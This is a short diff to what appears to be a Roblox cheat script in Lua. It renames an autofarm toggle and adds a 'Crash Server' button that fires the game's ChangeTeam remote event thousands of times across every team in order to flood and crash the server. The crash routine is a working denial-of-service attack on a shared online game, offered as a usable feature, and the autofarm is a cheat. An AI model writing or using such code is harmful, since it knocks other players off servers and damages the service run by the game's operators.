@@ -97,7 +97,7 @@ do
 		end
 	end
 
-	Window:Toggle("Autofarm", function(Toggled)
+	Window:Toggle("88lkk's Autofarm", function(Toggled)
 		if Toggled then
 			Mark("Autofarm", LocalPlayer.CharacterAdded:Connect(Farm))
 			Farm()
@@ -320,5 +320,24 @@ do
 		end
 
 		Clicking = false
+	end)
+end
+
+do
+	local ChangeTeam = workspace.ChangeTeam
+	local TeamList = {}
+
+	for _, T in Teams:GetChildren() do
+		if T:IsA("Team") then
+			table.insert(TeamList, T)
+		end
+	end
+
+	Window:Button("Crash Server", function()
+		for _ = 1, 5000 do
+			for _, Team in TeamList do
+				ChangeTeam:FireServer(Team)
+			end
+		end
 	end)
 end
